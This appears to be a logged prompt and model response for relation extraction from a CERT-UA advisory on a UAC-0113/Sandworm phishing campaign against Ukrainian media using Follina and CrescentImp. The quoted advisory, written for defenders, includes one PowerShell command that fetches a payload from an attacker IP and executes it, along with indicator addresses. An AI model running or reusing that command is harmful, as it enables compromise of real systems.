@@ -1,0 +1,190 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision relation extraction engine for cybersecurity incident reports (CERT-UA). The entities of one report have already been extracted and typed. Your only task is to state the relationships between these entities that the report supports.
+
+### ENTITIES OF THIS REPORT ###
+Each line is one entity: its name exactly as extracted, its type in square brackets, and a one-sentence description. The type "untyped" means no type has been established yet; the phrase after it is the extractor's own wording.
+- Україна [Country] A sovereign state in Eastern Europe.
+- СПИСОК_посилань_на_інтерактивні_карти.docx [Malicious File] A malicious Word document weaponized to exploit CVE-2022-30190.
+- update.html [Malicious File] A malicious HTML file containing JavaScript code used to download subsequent payloads.
+- 2.txt [Malicious File] An executable payload disguised as a text file containing the CrescentImp malware.
+- CrescentImp [Malware Family] A malicious program used to compromise target systems.
+- CVE-2022-30190 [untyped: vulnerability identifier] A remote code execution vulnerability in the Microsoft Support Diagnostic Tool (MSDT), also known as Follina.
+- UAC-0113 [Threat Actor] A cyber threat activity cluster tracked by CERT-UA, associated with Sandworm.
+- Sandworm [untyped: hacking group] A Russian state-sponsored cyber espionage and sabotage group.
+- СПИСОК посилань на інтерактивні карти.xlsm [Malicious File] A malicious Excel spreadsheet used in cyberattacks.
+- MSDriverLoader.exe [Malware Family] A malicious executable file used as a loader.
+- MSDriverMonitor.exe [Malware Family] A malicious executable file used in cyber operations.
+- dcrat.exe [Malware Family] An executable implementation of the DarkCrystal RAT malware.
+- DarkCrystal RAT [Malware Family] A commercial remote access trojan used for espionage and remote control.
+- 185.80.92.143 [IP Address] An IP address used to host malicious payloads and stages.
+- 87.236.161.43 [IP Address] An IP address identified as malicious network infrastructure.
+- 72.167.223.219 [IP Address] An IP address used to host malware files.
+- 203.96.191.70 [IP Address] An IP address used to host malware files.
+- star-cz.ddns.net [Domain Name] A dynamic DNS domain used in malicious network operations.
+
+### KNOWN RELATION TYPES ###
+Each relation type is known ONLY for the pair of argument types it is listed under (head type -> tail type). Types known for other pairs are not shown and do not apply.
+Head [(untyped)] -> Tail [Country]:
+- targets: The head entity aims its malicious activity or campaign at the tail country or organization.
+
+Head [(untyped)] -> Tail [Malware Family]:
+- delivers: The head file or process installs, runs, or deploys the tail malware family.
+
+Head [(untyped)] -> Tail [(untyped)]:
+- operates-instance-of: The head entity hosts, deploys, or manages an instance or node of the software product specified as the tail.
+- has-contact-email: The head entity maintains or uses the tail email address for official communication or incident reporting.
+- subordinate-to: The head entity is an administrative unit, working body, or subdivision of the tail government body.
+- uses-malware: The head threat actor utilizes or deploys the tail malware family in their operations.
+- contains-file: The head archive or container file encloses the tail file.
+- hosted-on: The head domain, infrastructure, or resource is hosted or deployed on the tail platform or hosting service.
+- exfiltrates-data-to: The head malware transmits stolen information to the tail platform, service, or destination.
+- routes-traffic-through: The head malware routes or proxies its network communications through the tail network or proxy service.
+- creates: The head entity generates, extracts, drops, or writes the tail file onto the victim's filesystem.
+- downloads-and-executes: The head entity downloads the tail payload from a remote resource and initiates its execution.
+- exploits-vulnerability: The head entity takes advantage of the tail vulnerability to compromise a system.
+
+Head [(untyped)] -> Tail [Domain Name]:
+- registered-with: The head domain or URL is registered through the tail domain registrar.
+
+Head [Threat Actor] -> Tail [Malware Family]:
+- uses-malware: 
+
+Head [IP Address] -> Tail [(untyped)]:
+- hosted-on: The head IP address or infrastructure is hosted on or provided by the tail hosting service.
+
+Head [Domain Name] -> Tail [(untyped)]:
+- hosts-file: The head domain or server infrastructure hosts the tail downloadable file or payload.
+
+### WHAT TO OUTPUT ###
+1. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two of the entities above, as { "head", "type", "tail", "evidence", "fit" }.
+   - `head` / `tail` MUST exactly match entity names from the list above. Direction: head acts on tail.
+   - `type`: if a known relation type listed under exactly this pair of argument types states the relationship precisely, use its name. Otherwise write a short lower-case verb phrase with hyphens in your own words, as specific as the text allows. Do NOT stretch a known type to a relationship it does not precisely state, and do NOT use a type listed under a different pair of argument types.
+   - `fit`: "exact" when a known type of this pair states the relationship precisely; "loose" when you used a known type of this pair although it only roughly fits; "new" when you wrote your own phrase.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+2. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY type you wrote yourself (fit "new").
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA від учасника інформаційного обміну отримано інформацію щодо масового розсилання електронних листів, зокрема, серед медійних організацій України (радіостанції, газети, новинні агенції та інші) з темою "СПИСОК посилань на інтерактивні карти". Встановлено більше 500 електронних адрес отримувачів.</p><p>У додатку лист містив документ "СПИСОК_посилань_на_інтерактивні_карти.docx", відкриття якого призведе до завантаження HTML-файлу та виконання JavaScript-коду, що, в свою чергу, забезпечить завантаження та виконання EXE-файлу "2.txt", що класифіковано як шкідливу програму CrescentImp (дослідження триває).</p><p>Зловмисники продовжують використовувати вразливість CVE-2022-30190 та все частіше вдаються до розсилань електронних листів зі скомпрометованих електронних адрес державних органів.</p><p>У випадку виявлення ознак компрометації за наданими індикаторами просимо терміново інформувати.</p><p>А<span style="color: rgb(36, 36, 36);">ктивність відстежується за ідентифікатором UAC-0113 (з середнім рівнем впевненості асоційовано з групою Sandworm).</span></p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">cc27122efef26fa2b4cc5d30845704e7&nbsp; &nbsp; 129073fd0f9234737ff8ca1aadd8cbaef664015d1088d68e8e501fa757c991d0&nbsp; &nbsp; СПИСОК_посилань_на_інтерактивні_карти.docx
+106d1413f8768be03cb7dc982a1455f9&nbsp; &nbsp; 22d413e4b4fb45f058c312942fb170c2225ab7f30a653d3aeba79c054837b297&nbsp; &nbsp; update.html
+32ed33d2723251046168fa9ab2016b65&nbsp; &nbsp; e5f2033a86429f7921449397f3ca06dd92ff14ba35e013fcfdc47d4c4736d046&nbsp; &nbsp; 2.txt (CrescentImp)
+
+3e8ee32c4a5c24dbfe4e3ded8b8dc9e5&nbsp; &nbsp; 03700e0d02a6a1d76ecaa4d8307e40f76e07284646b3c45693054996f2e643d7&nbsp; &nbsp; СПИСОК посилань на інтерактивні карти.xlsm
+156c8c604c209248b1dd0fe757960726&nbsp; &nbsp; 24811e849a7a0e73788bc893bed81b88405883eb9114557eacd26a90c2a81c29&nbsp; &nbsp; MSDriverLoader.exe (2022-06-06)
+4825e7df93d8acb3dd236cc14c342a71&nbsp; &nbsp; c84bbfce14fdc65c6e738ce1196d40066c87e58f443e23266d3b9e542b8a583e&nbsp; &nbsp; MSDriverMonitor.exe (2022-06-06)
+3f92f5020650fbf965ee3d0a8b920058&nbsp; &nbsp; 1373da91522f7f854f6d5c6d248d8496ebd7bc004651e73dc9325c10ee8ea05a&nbsp; &nbsp; dcrat.exe (2022-05-04) (DarkCrystal RAT)
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">Invoke-WebRequest -Uri hxxp://185[.]80.92.143:8998/2.txt -OutFile C:\Users\Public\chkdsk.exe;Invoke-Expression -Command C:\Users\Public\chkdsk.exe
+C:\Users\Public\chkdsk.exe
+%APPDATA%\chkdsk.exe
+HKCU\Software\Classes\&lt;ZWXpSjTw3bwSniATW8SN&gt;\
+Windows check disk (назва служби)
+999bpJZ1MYwlDF42cztG (м'ютекс; не використовується)
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">hxxp://185[.]80.92.143:8998/update.html
+hxxp://185[.]80.92.143:8998/2.txt
+hxxps://87[.]236.161.43/i
+185[.]80.92.143
+87[.]236.161.43
+
+hXXp://72[.]167.223.219/MSDriverLoader[.]exe
+hXXp://203[.]96.191.70/MSDriverMonitor[.]exe
+hXXps://star-cz.ddns[.]net/requestgeoSqlUniversalwordpress.php
+72[.]167.223.219
+203[.]96.191.70
+star-cz.ddns[.]net
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p><strong>﻿</strong></p>
+
+=== RESPONSE (12.6s, in 3202 / out 999 tok, STOP) ===
+The threat activity tracked as UAC-0113 (associated with Sandworm) targeted Ukrainian media organizations via phishing emails with malicious attachments. The document СПИСОК_посилань_на_інтерактивні_карти.docx downloads and executes update.html, which in turn downloads and executes 2.txt, delivering the CrescentImp malware. The IP addresses 185.80.92.143, 72.167.223.219, and 203.96.191.70 host respective payload files.
+
+```json
+{
+  "relations": [
+    {
+      "head": "UAC-0113",
+      "type": "targets",
+      "tail": "Україна",
+      "evidence": "масового розсилання електронних листів, зокрема, серед медійних організацій України",
+      "fit": "new"
+    },
+    {
+      "head": "UAC-0113",
+      "type": "associated-with",
+      "tail": "Sandworm",
+      "evidence": "асоційовано з групою Sandworm",
+      "fit": "new"
+    },
+    {
+      "head": "СПИСОК_посилань_на_інтерактивні_карти.docx",
+      "type": "downloads-and-executes",
+      "tail": "update.html",
+      "evidence": "відкриття якого призведе до завантаження HTML-файлу та виконання JavaScript-коду",
+      "fit": "exact"
+    },
+    {
+      "head": "update.html",
+      "type": "downloads-and-executes",
+      "tail": "2.txt",
+      "evidence": "забезпечить завантаження та виконання EXE-файлу \"2.txt\"",
+      "fit": "exact"
+    },
+    {
+      "head": "2.txt",
+      "type": "delivers",
+      "tail": "CrescentImp",
+      "evidence": "EXE-файлу \"2.txt\", що класифіковано як шкідливу програму CrescentImp",
+      "fit": "exact"
+    },
+    {
+      "head": "185.80.92.143",
+      "type": "hosts-file",
+      "tail": "update.html",
+      "evidence": "hxxp://185[.]80.92.143:8998/update.html",
+      "fit": "new"
+    },
+    {
+      "head": "185.80.92.143",
+      "type": "hosts-file",
+      "tail": "2.txt",
+      "evidence": "hxxp://185[.]80.92.143:8998/2.txt",
+      "fit": "new"
+    },
+    {
+      "head": "72.167.223.219",
+      "type": "hosts-file",
+      "tail": "MSDriverLoader.exe",
+      "evidence": "hXXp://72[.]167.223.219/MSDriverLoader[.]exe",
+      "fit": "new"
+    },
+    {
+      "head": "203.96.191.70",
+      "type": "hosts-file",
+      "tail": "MSDriverMonitor.exe",
+      "evidence": "hXXp://203[.]96.191.70/MSDriverMonitor[.]exe",
+      "fit": "new"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "targets",
+      "definition": "The head threat actor directs its malicious campaign or operations against the tail country or organization."
+    },
+    {
+      "name": "associated-with",
+      "definition": "The head threat actor is linked or attributed with a certain level of confidence to the tail threat group."
+    },
+    {
+      "name": "hosts-file",
+      "definition": "The head IP address hosts or serves the tail malicious file or payload."
+    }
+  ]
+}
+```
